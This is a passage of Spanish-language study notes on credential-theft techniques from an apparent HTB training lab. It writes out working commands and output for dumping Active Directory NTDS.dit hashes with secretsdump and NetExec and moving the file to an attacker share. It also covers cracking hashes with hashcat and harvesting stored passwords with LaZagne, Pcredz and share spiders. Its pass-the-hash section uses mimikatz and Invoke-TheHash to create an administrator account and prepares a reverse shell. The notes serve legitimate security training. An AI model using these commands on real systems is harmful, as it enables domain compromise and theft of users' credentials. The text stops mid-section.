> Como fue el caso con ``SAM``, los hashes almacenados en *NTDS.dit* están encriptados con una ``clave almacenada en SYSTEM`` **para extraer con éxito los hashes, uno debe descargar ambos archivos**. 



##### Transferring NTDS.dit to the attack host

Ahora ``cmd.exe /c move`` se puede utilizar para mover el archivo desde el DC de destino al recurso compartido en nuestro host de ataque. 


``` cs
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

        1 file(s) moved.		
```


###### Extracting hashes from NTDS.dit

Con una copia de ``NTDS.dit`` en nuestro host de ataque, *podemos proceder a volcar los hashes*. Una forma de hacerlo es con *Impacket-secretsdump*: 

``` javascript
MrBloody@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
[*] Reading and decrypting hashes from NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
<SNIP>
```

---
# A faster method: Use NetExec to capture NTDS.dit

Como alternativa, podemos beneficiarnos del uso de ``NetExec`` para realizar los mismos pasos mostrados anteriormente, *todo con un solo comando*. Este comando nos permite usar ``VSS`` para capturar y ``volcar rápidamente el contenido del archivo NTDS.dit`` cómodamente desde nuestra sesión de terminal. 

``` python
MrBloody@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil

SMB         10.129.201.57   445     DC01         [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57   445     DC01         [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
NTDSUTIL    10.129.201.57   445     DC01         [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\174556000
NTDSUTIL    10.129.201.57   445     DC01         Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.201.57   445     DC01         [+] NTDS.dit dumped to C:\Windows\Temp\174556000
NTDSUTIL    10.129.201.57   445     DC01         [*] Copying NTDS dump to /tmp/tmpcw5zqy5r
NTDSUTIL    10.129.201.57   445     DC01         [*] NTDS dump copied to /tmp/tmpcw5zqy5r
NTDSUTIL    10.129.201.57   445     DC01         [+] Deleted C:\Windows\Temp\174556000 remote dump directory
NTDSUTIL    10.129.201.57   445     DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.201.57   445     DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
NTDSUTIL    10.129.201.57   445     DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    10.129.201.57   445     DC01         DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-NKHHJGP3SMT:1106:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec90765d5eb95f:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-K5E9CWYEG7Z:1107:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45ed10e0f5c:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-5MG4NRVHF2W:1108:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10f4d62400:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-UISCTR0XLKW:1109:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf5647e558ee:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-ETN7BWMPGXD:1110:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f56039e9d8e7:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\bburgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jstevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jjohnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jdoe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
NTDSUTIL    10.129.201.57   445     DC01         Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
NTDSUTIL    10.129.201.57   445     DC01         Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
NTDSUTIL    10.129.201.57   445     DC01         Administrator:des-cbc-md5:618c1c5ef780cde3
NTDSUTIL    10.129.201.57   445     DC01         DC01$:aes256-cts-hmac-sha1-96:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9
NTDSUTIL    10.129.201.57   445     DC01         DC01$:aes128-cts-hmac-sha1-96:ea10ef59d9ec03a4162605d7306cc78d
NTDSUTIL    10.129.201.57   445     DC01         DC01$:des-cbc-md5:a2852362e50eae92
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:aes128-cts-hmac-sha1-96:1fe3f211d383564574609eda482b1fa9
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:des-cbc-md5:9bd5017fdcea8fae
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:aes256-cts-hmac-sha1-96:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:aes128-cts-hmac-sha1-96:d2377357d473a5309505bfa994158263
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:des-cbc-md5:79ab08755b32dfb6
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-96:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-
NTDSUTIL    10.129.201.57   445     DC01         [+] Dumped 61 NTDS hashes to /home/bob/.nxc/logs/DC01_10.129.201.57_2025-04-25_084640.ntds of which 15 were added to the database
NTDSUTIL    10.129.201.57   445    DC01          [*] To extract only enabled accounts from the output file, run the following command: 
NTDSUTIL    10.129.201.57   445    DC01          [*] grep -iv disabled /home/bob/.nxc/logs/DC01_10.129.201.57_2025-04-25_084640.ntds | cut -d ':' -f1
```

---
# Decrypting hashes and obtaining credentials

Podemos proceder a crear un archivo de texto que contenga todos los hashes NT, o podemos copiar y pegar individualmente un hash específico en una sesión de terminal y usar Hashcat para intentar descifrar el hash y una contraseña en texto sin cifrar. 

``` css
MrBloody@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```


## Consideraciones sobre Pass the Hash (PtH)

Todavía podemos usar hashes para intentar autenticarnos con un sistema usando un tipo de ataque llamado ``Pass-the-Hash( PtH)``. Un ataque PtH aprovecha el ``protocolo de autenticación NTLM`` para autenticar a un usuario mediante un ``hash`` de contraseña. En lugar de username: clear-text password como formato para iniciar sesión, podemos utilizar username: password hash. He aquí un ejemplo de cómo funcionaría esto:


``` css
MrBloody@htb[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

![Pasted image 20250701173922.png](/img/user/imgs/Pasted%20image%2020250701173922.png)

![Pasted image 20250701173944.png](/img/user/imgs/Pasted%20image%2020250701173944.png)

![Pasted image 20250701174003.png](/img/user/imgs/Pasted%20image%2020250701174003.png)


### Lazagne

También podemos aprovechar herramientas de terceros como LaZagne para descubrir rápidamente las credenciales que los navegadores web u otras aplicaciones instaladas pueden almacenar de forma insegura.

![Pasted image 20250701181242.png](/img/user/imgs/Pasted%20image%2020250701181242.png)

Una vez LaZagne.exe está en el objetivo, podemos abrir el símbolo del sistema o PowerShell, navegar al directorio donde se cargó el archivo y ejecutar el siguiente comando:

``` css
C:\Users\bob\Desktop> start LaZagne.exe all
```

Esto ejecutará LaZagne y se ejecutará allMódulos incluidos. Podemos incluir la opción -vvPara estudiar lo que hace en segundo plano. Al pulsar Enter, se abrirá otro mensaje y mostrará los resultados. 


``` css
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22

```

Si usáramos el **-vv** Si se utiliza esta opción, se verían intentos de obtener contraseñas de todo el software compatible con **LaZagne**. También podemos consultar la página de GitHub, en la sección de software compatible, para ver todos los programas de los que LaZagne intentará obtener credenciales. Puede resultar sorprendente lo fácil que es obtener credenciales en texto plano. Gran parte de esto se debe a la forma insegura en que muchas aplicaciones almacenan las credenciales. 


### findstr

También podemos usar ``findstr`` para buscar patrones en varios tipos de archivos. Teniendo en cuenta los términos clave comunes, podemos usar variaciones de este comando para descubrir credenciales en un destino de Windows: 

``` python
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```


#### Additional considerations

Aquí hay algunos otros lugares que debemos tener en cuenta al buscar credenciales: 

![Pasted image 20250701182507.png](/img/user/imgs/Pasted%20image%2020250701182507.png)


![Pasted image 20250701184701.png](/img/user/imgs/Pasted%20image%2020250701184701.png)

---
# Linux Authentication Process

Las distribuciones basadas en Linux admiten diversos mecanismos de autenticación. Uno de los más utilizados son los ``Módulos de Autenticación Conectables (PAM)``. Los módulos responsables de esta funcionalidad, como pam_unix.so o pam_unix2.so, normalmente se encuentran en ``/usr/lib/x86_64-linux-gnu/security/`` En sistemas basados ​​en Debian.

El ``pam_unix.so`` el módulo utiliza llamadas API estandarizadas de las bibliotecas del sistema para actualizar la información de la cuenta. Los archivos principales que lee y en los que escribe son ``/etc/passwd`` y ``/etc/shadow`` PAM también incluye muchos otros módulos de servicio, como aquellos para LDAP, operaciones de montaje y autenticación Kerberos.

## Archive Passwd

El ``/etc/passwd`` el archivo contiene información sobre cada usuario del sistema y es legible para todos los usuarios y servicios. Cada entrada del archivo corresponde a un solo usuario y consta de ``seven fields``, que almacenan datos relacionados con el usuario en un formato estructurado. Estos campos están separados por dos puntos ``(:).`` Por lo tanto, una entrada típica podría verse así: 


``` css
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```



Por lo general, encontraremos el valor xEn este campo, se indica que las contraseñas se almacenan en formato hash dentro del /etc/shadowarchivo. Sin embargo, también puede ser que el /etc/passwdEl archivo se puede escribir por error. Esto nos permitiría eliminar el campo de contraseña. rootusuario en su totalidad. 
``` css
MrBloody@htb[/htb]$ head -n 1 /etc/passwd

root::0:0:root:/root:/bin/bash
```


Esto hace que no se muestre ninguna solicitud de contraseña al intentar iniciar sesión como root. 
``` css
MrBloody@htb[/htb]$ su

root@htb[/htb]#
```


Aunque los escenarios descritos son poco frecuentes, debemos prestar atención y estar atentos a posibles vulnerabilidades de seguridad, ya que existen aplicaciones que requieren permisos específicos para carpetas enteras.


### Shadow file

Dado que leer los valores hash de las contraseñas puede poner en riesgo todo el sistema, /etc/shadow se introdujo el archivo. Tiene un formato similar a /etc/passwd pero es el único responsable del almacenamiento y la gestión de contraseñas. Contiene toda la información de contraseñas de los usuarios creados. Por ejemplo, si no hay ninguna entrada en el ``... /etc/shadow`` archivo para un usuario que aparece en ``/etc/passwd``, ese usuario se considera inválido. El ``/etc/shadow`` El archivo también solo puede ser leído por usuarios con privilegios administrativos. 

``` css
htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
```

![Pasted image 20250701194709.png](/img/user/imgs/Pasted%20image%2020250701194709.png)

Si el ``Password`` el campo contiene un carácter como ``!`` o ``*`` el usuario no puede iniciar sesión con una contraseña de Unix. Sin embargo, se pueden usar otros métodos de autenticación, como Kerberos o la autenticación basada en claves. Lo mismo aplica si... ``Password`` el campo está vacío, lo que significa que no se requiere contraseña para iniciar sesión. Esto puede provocar que ciertos programas denieguen el acceso a funciones específicas. ``Password`` el campo también sigue un formato particular, del cual podemos extraer información adicional: 


``` css

    $<id>$<salt>$<hashed>

```


Como podemos ver aquí, las contraseñas hash se dividen en tres partes. ID el valor especifica qué algoritmo hash criptográfico se utilizó, normalmente uno de los siguientes: 

![Pasted image 20250701195021.png](/img/user/imgs/Pasted%20image%2020250701195021.png)

Muchas distribuciones de Linux, incluida Debian, ahora utilizan ``yescrypt`` como algoritmo hash predeterminado. Sin embargo, en sistemas más antiguos, aún podemos encontrar otros métodos hash que podrían ser descifrados. En breve, explicaremos cómo funciona el proceso de descifrado. 


## Opasswd:

La biblioteca PAM ``(pam_unix.so)`` puede evitar que los usuarios reutilicen contraseñas antiguas. Estas contraseñas anteriores se almacenan en el ``/etc/security/opasswd`` Se requieren privilegios de administrador (root) para leer este archivo, asumiendo que sus permisos no se hayan modificado manualmente.


``` css
MrBloody@htb[/htb]$ sudo cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1

```

Mirando el contenido de este archivo, podemos ver que contiene varias entradas para el usuario ``cry0l1t3``, separados por una coma ``(,)``. Un detalle crítico al que hay que prestar atención es el tipo de hash que se ha utilizado. Esto se debe a que ``MD5``( ``$1$`` El algoritmo SHA-512 es mucho más fácil de descifrar.


## Decrypting Linux Credentials

``` css
MrBloody@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
MrBloody@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
MrBloody@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

```


Este archivo ``"shadow"`` ahora puede ser atacado con ``JtR`` o ``hashcat``.

``` css
MrBloody@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```



> [!NOTE] Nota:
> 

Este es el escenario exacto que ``JtR`` ``single crack mode``.

---

# Credential Hunting in Network Traffic

En el mundo actual, preocupado por la seguridad, la mayoría de las aplicaciones utilizan TLS para cifrar datos confidenciales en tránsito. Sin embargo, no todos los entornos son completamente seguros. Los sistemas heredados, los servicios mal configurados o las aplicaciones de prueba iniciadas sin HTTPS pueden dar lugar al uso de protocolos sin cifrar, como HTTP o SNMP.
![Pasted image 20250701205553.png](/img/user/imgs/Pasted%20image%2020250701205553.png)

## Wireshark 
![Pasted image 20250701205611.png](/img/user/imgs/Pasted%20image%2020250701205611.png)

Por ejemplo, en la imagen a continuación estamos filtrando sin cifrar. HTTP tráfico. 

![Pasted image 20250701205732.png](/img/user/imgs/Pasted%20image%2020250701205732.png)

En *Wireshark*, es posible localizar paquetes que contienen bytes o cadenas específicos. Una forma de hacerlo es mediante un filtro de visualización como ``http contains "passw"`` alternativamente, puede navegar a ``Edit > Find Packet`` ingrese manualmente la consulta de búsqueda deseada. Por ejemplo, podría buscar paquetes que contengan la cadena ``"passw"``: 

![Pasted image 20250701205851.png](/img/user/imgs/Pasted%20image%2020250701205851.png)

# Pcredz

Pcredz es una herramienta que permite extraer credenciales del tráfico en tiempo real o de capturas de paquetes de red. En concreto, permite extraer la siguiente información: 

![Pasted image 20250701205919.png](/img/user/imgs/Pasted%20image%2020250701205919.png)

Para poder correr ``Pcredz``, se puede clonar el repositorio e instalar todas las dependencias, o utilizar el contenedor Docker.


El siguiente comando se puede utilizar para ejecutar ``Pcredz`` contra un archivo de captura de paquetes: 


``` c
MrBloody@htb[/htb]$ ./Pcredz -f demo.pcapng -t -v

Pcredz 2.0.2
Author: Laurent Gaffie
Please send bugs/comments/pcaps to: laurent.gaffie@gmail.com
This script will extract NTLM (HTTP,LDAP,SMB,MSSQL,RPC, etc), Kerberos,
FTP, HTTP Basic and credit card data from a given pcap file or from a live interface.

CC number scanning activated

Unknown format, trying TCPDump format

[1746131482.601354] protocol: udp 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2 Community string: s3cr...SNIP...

[1746131482.601640] protocol: udp 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2 Community string: s3cr...SNIP...

<SNIP>

[1746131482.658938] protocol: tcp 192.168.31.243:55707 > 192.168.31.211:21
FTP User: le...SNIP...
FTP Pass: qw...SNIP...

demo.pcapng parsed in: 1.82 seconds (File size 15.5 Mo).
```

![Pasted image 20250701213153.png](/img/user/imgs/Pasted%20image%2020250701213153.png)

![Pasted image 20250701213237.png](/img/user/imgs/Pasted%20image%2020250701213237.png)

 Use Pcredz para encontrar datos anormales y obtuve credenciales e indicios para encontrar la tarjeta.


---

# Credential Hunting in Network Shares

Casi todos los entornos corporativos incluyen recursos compartidos de red que los empleados utilizan para almacenar y compartir archivos entre equipos.Si bien estas carpetas compartidas son esenciales, pueden convertirse involuntariamente en una mina de oro para los atacantes.

Especialmente si se olvidan ``credenciales`` o archivos de ``configuración``


## Common credential patterns

Es importante comprender los tipos de patrones y formatos de archivo que suelen revelar información confidencial.

![Pasted image 20250702010039.png](/img/user/imgs/Pasted%20image%2020250702010039.png)

Con todo esto en mente, es posible que desee comenzar con búsquedas básicas en la línea de comandos (por ejemplo, **Get-ChildItem -Recurse -Include ``*``.ext \\Server\Share | Select-String -Pattern ...**) antes de escalar a herramientas más avanzadas.

Veremos como usar ``MANSPIDER``, ``Snaffler``, ``SnafflePy``, y ``NetExec`` para automatizar y mejorar este proceso de búsqueda de credenciales.


### Hunting from Windows

#### Snaffler

La primera herramienta es *Snaffler*, es una herramienta hecha en ``C#`` que, cuando ejecuta en una máquina ``domain-joined``, identifica automáticamente los recursos compartidos de red accesibles y busca archivos interesantes. El archivo `README` repositorio de Github describe varias opciones de configuración detallada, sin embargo, se puede realizar una búsqueda básica.

``` cs
c:\Users\Public>Snaffler.exe -s

 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$ 'Y$c$c$$cc$$c`$

Todas las herramientas cubiertas en esta sección generan un ``'large amount of information'``, si bien ayudan con la automatización, generalmente se requiere una buena cantidad de revisión manual, ya que muchas coincidencias puede ser ``'false positive'``. Dos parámetros útiles que pueden ayudar a refinar el proceso de búsqueda de *Snaffler* son:

![Pasted image 20250702015444.png](/img/user/imgs/Pasted%20image%2020250702015444.png)

#### PowerHuntShares

Otra herramienta que se puede utilizar es ``PowerHuntShares`` , un script de *PowerShell* que no necesariamente debe ejecutarse en una máquina unida a un dominio. Una de sus funciones más útiles es que genera un ``HTML report`` al finalizar, se proporciona una interfaz de usuario fácil de usar para revisar los resultados:

![Pasted image 20250702015847.png](/img/user/imgs/Pasted%20image%2020250702015847.png)

Podemos ejecutar un escaneo básico usando ``PowerHuntShares`` así: 

``` cs
PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public

 ===============================================================
 INVOKE-HUNTSMBSHARES
 ===============================================================
  This function automates the following tasks:

  o Determine current computer's domain
  o Enumerate domain computers
  o Check if computers respond to ping requests
  o Filter for computers that have TCP 445 open and accessible
  o Enumerate SMB shares
  o Enumerate SMB share permissions
  o Identify shares with potentially excessive privileges
  o Identify shares that provide read or write access
  o Identify shares thare are high risk
  o Identify common share owners, names, & directory listings
  o Generate last written & last accessed timelines
  o Generate html summary report and detailed csv files

  Note: This can take hours to run in large environments.
 ---------------------------------------------------------------
 |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 ---------------------------------------------------------------
 SHARE DISCOVERY
 ---------------------------------------------------------------
 [*][05/01/2025 12:51] Scan Start
 [*][05/01/2025 12:51] Output Directory: c:\Users\Public\SmbShareHunt-05012025125123
 [*][05/01/2025 12:51] Successful connection to domain controller: DC01.inlanefreight.local
 [*][05/01/2025 12:51] Performing LDAP query for computers associated with the inlanefreight.local domain
 [*][05/01/2025 12:51] -  computers found
 [*][05/01/2025 12:51] - 0 subnets found
 [*][05/01/2025 12:51] Pinging  computers
 [*][05/01/2025 12:51] -  computers responded to ping requests.
 [*][05/01/2025 12:51] Checking if TCP Port 445 is open on  computers
 [*][05/01/2025 12:51] - 1 computers have TCP port 445 open.
 [*][05/01/2025 12:51] Getting a list of SMB shares from 1 computers
 [*][05/01/2025 12:51] - 11 SMB shares were found.
 [*][05/01/2025 12:51] Getting share permissions from 11 SMB shares
<SNIP>
```


### Hunting from Linux

#### MANSPIDER

Si no tenemos acceso a un equipo unido al dominio, o simplemente preferimos buscar archivos de forma remota, herramientas como ``MANSPIDER`` nos permiten escanear recursos compartidos SMB desde Linux. 

``` cs
MrBloody@htb[/htb]$ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'

[+] MANSPIDER command executed: /usr/local/bin/manspider 10.129.234.121 -c passw -u mendres -p Inlanefreight2025!
[+] Skipping files larger than 10.00MB
[+] Using 5 threads
[+] Searching by file content: "passw"
[+] Matching files will be downloaded to /root/.manspider/loot
[+] 10.129.234.121: Successful login as "mendres"
[+] 10.129.234.121: Successful login as "mendres"
<SNIP>
```


#### NetExec

Además de sus muchos otros usos, ``NetExec`` También se puede utilizar para buscar recursos compartidos de red mediante el ``--spider`` opción. Esta función se describe con gran detalle en la wiki oficial . 


Esta función se describe con gran detalle en la wiki oficial . Un análisis básico de recursos compartidos de red para archivos que contengan la cadena **"passw"** Se puede ejecutar así:

```cs
MrBloody@htb[/htb]$ nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"

SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)
SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! 
SMB         10.129.234.121  445    DC01             [*] Started spidering
SMB         10.129.234.121  445    DC01             [*] Spidering .
<SNIP>
```


![Pasted image 20250702060047.png](/img/user/imgs/Pasted%20image%2020250702060047.png)

![Pasted image 20250702060341.png](/img/user/imgs/Pasted%20image%2020250702060341.png)



![Pasted image 20250702215635.png](/img/user/imgs/Pasted%20image%2020250702215635.png)


![Pasted image 20250704011534.png](/img/user/imgs/Pasted%20image%2020250704011534.png)


---

# Pass the Hash (PtH)

Es una técnica que consiste en que un atacante utiliza un ``hash`` de contraseña en lugar de la contraseña en texto plano para la autenticación. El atacante no necesita descifrar el hash para obtener una contraseña en texto plano. 

Los ``ataques PtH`` explotan el protocolo de autenticación, ya que el hash de la contraseña permanece estático en cada sesión hasta que se cambia la contraseña. 

![Pasted image 20250704024045.png](/img/user/imgs/Pasted%20image%2020250704024045.png)


> [!NOTE] NOTA:
> Las herramientas que utilizaremos se encuentran en el directorio *C:\tools* en el host de destino. Una vez que inicie la máquina y complete los ejercicios, podrá usar las herramientas en ese directorio. Este laboratorio consta de dos máquinas: *tendrá acceso a una (MS01) y, desde allí, se conectará a la segunda (DC01)*. 


## Introduction to Windows NTML


**El Administrador de LAN de nuevas Tecnologías de Windows (NTML)** de Microsoft, es un conjunto de protocolos de seguridad que autentica la identidad de los usuarios a la vez que protege la integridad y confidencialidad de sus datos. 

NTLM es una solución de inicio de sesión único (SSO) que utiliza un protocolo de desafío-respuesta para verificar la identidad del usuario sin necesidad de proporcionar una contraseña.

Con NTLM, las contraseñas almacenadas en el servidor y el controlador de dominio no están "salteadas", lo que significa que un adversario con un hash de contraseña puede autenticar una sesión sin conocer la contraseña original. A esto le llamamos...`Pass the Hash (PtH) Attack`.


### Pass the Hash with Mimikatz (Windows)

Las primeras herramientas que usaremos para realizar un ataque Pass the Hash es ``MIMIKATZ``. ``Mimikatz`` tiene un módulo llamado `sekurlsa::pth`. Esto nos permite realizar un ataque PASS-THE-HASH iniciando un proceso con el hash de la password del usuario. Para usar el módulo necesitamos lo siguiente:


![Pasted image 20250704025120.png](/img/user/imgs/Pasted%20image%2020250704025120.png)

#### Pass the hash from Windows using Mimikatz

``` css
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```


Usaremos cmd.exe para ejecutar comandos en el contexto del usuario. Por ejemplo `julio` puede conectarse a una carpeta llamada `julio` en el DC.

![Pasted image 20250704025326.png](/img/user/imgs/Pasted%20image%2020250704025326.png)


#### Pass the Hash with Powershell Invoke-TheHash (Windows)

Otra herramienta que podemos usar para realizar ataques de ``Pass the Hash`` en Windows es ``Invoke-TheHash`` . Esta herramienta es un conjunto de funciones de ``PowerShell`` para realizar ataques de ``Pass the Hash`` con ``WMI`` y ``SMB``.

La autenticación se realiza pasando un Hash NTML al protocolo de autenticación NTLMv2. `No se requieren privilegios de administrator local en el lado del cliente`, pero el usuario y el hash que usamos para la autenticación deben tener derechos administrativos en el equipo destino.


![Pasted image 20250704025952.png](/img/user/imgs/Pasted%20image%2020250704025952.png)



El siguiente comando utilizará el método SMB para la ejecución de comandos para crear un nuevo usuario llamado ``mark`` y agregarlo al grupo ``Administradores``. 


``` css
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```


También podemos obtener una conexión de Shell inversa en la máquina de destino.

Para obtener un Shell inverso, necesitamos iniciar nuestro oyente usando Netcat en nuestra máquina Windows, que tiene la ``dirección IP 172.16.1.5`` usaremos el puerto *8001* para esperar la conexión. 

![Pasted image 20250704030231.png](/img/user/imgs/Pasted%20image%2020250704030231.png)


Para crear un Shell inverso simple usando ``PowerShell``, podemos visitar ``revshells.com`` , configurar nuestra IP ``172.16.1.5 ``y puerto ``8001``, y seleccione la opción PowerShell #3 (Base64), como se muestra en la siguiente imagen. 

![Pasted image 20250704030309.png](/img/user/imgs/Pasted%20image%2020250704030309.png)


Ahora podemos ejecutar ``Invoke-TheHash``, para ejecutar nuestro script de Shell inverso de PowerShell en el equipo de destino. Observe que, en lugar de proporcionar la dirección IP, que es ``172.16.1.10``, usaremos el nombre de la máquina DC01(cualquiera funcionaría). 


##### Invoke-Thehash con WMI


``` css
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
